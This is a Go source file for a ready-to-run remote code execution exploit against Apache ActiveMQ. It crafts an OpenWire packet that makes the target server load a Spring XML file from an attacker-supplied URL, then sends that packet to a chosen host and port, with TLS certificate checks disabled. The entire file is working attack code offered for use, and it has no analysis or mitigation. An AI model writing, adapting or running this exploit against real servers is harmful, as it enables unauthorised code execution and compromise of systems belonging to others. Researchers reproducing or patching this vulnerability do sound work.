package main

import (
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
)

func main() {

	var (
		ip   string
		port string
		url  string
		ssl  bool
	)

	flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
	flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
	flag.StringVar(&url, "u", "", "Spring XML Url")
	flag.BoolVar(&ssl, "ssl", false, "Use SSL/TLS Connection")
	flag.Parse()

	banner()

	if ip == "" || url == "" {
		flag.Usage()
		return
	}

	className := "org.springframework.context.support.ClassPathXmlApplicationContext"
	message := url

	header := "1f00000000000000000001"
	body := header + "01" + int2Hex(len(className), 4) + string2Hex(className) + "01" + int2Hex(len(message), 4) + string2Hex(message)
	payload := int2Hex(len(body)/2, 8) + body
	data, _ := hex.DecodeString(payload)

	log.Println("[*] Target:", ip+":"+port)
	log.Println("[*] XML URL:", url)
	fmt.Println()
	log.Println("[*] Sending packet:", payload)

	target := ip + ":" + port
	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Panicf("failed to connect to host: %s\n%s", target, err.Error())
	}
	if err = sendPayload(conn, data, ssl); err != nil {
		log.Printf("failed to send payload to host: %s\n%s", target, err.Error())
	}
}

// sendPayload sends the payload with optional TLS support
func sendPayload(conn net.Conn, payload []byte, useTLS bool) error {
	if useTLS {
		// Create a TLS configuration with insecure skip verify
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
		}

		// Wrap the connection with TLS
		tlsConn := tls.Client(conn, tlsConfig)
		// Perform the TLS handshake. This step is important.
		if err := tlsConn.Handshake(); err != nil {
			panic(err)
		}
		_, err := tlsConn.Write(payload)
		if err != nil {
			return err
		}
		if err = tlsConn.Close(); err != nil {
			return err
		}
	} else {
		_, err := conn.Write(payload)
		if err != nil {
			return err
		}
		if err = conn.Close(); err != nil {
			return err
		}
	}
	log.Println("[+] Payload sent successfully")
	return nil
}

func banner() {
	fmt.Println("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n")
}

func string2Hex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func int2Hex(i int, n int) string {
	if n == 4 {
		return fmt.Sprintf("%04s", strconv.FormatInt(int64(i), 16))
	} else if n == 8 {
		return fmt.Sprintf("%08s", strconv.FormatInt(int64(i), 16))
	} else {
		panic("n must be 4 or 8")
	}
}
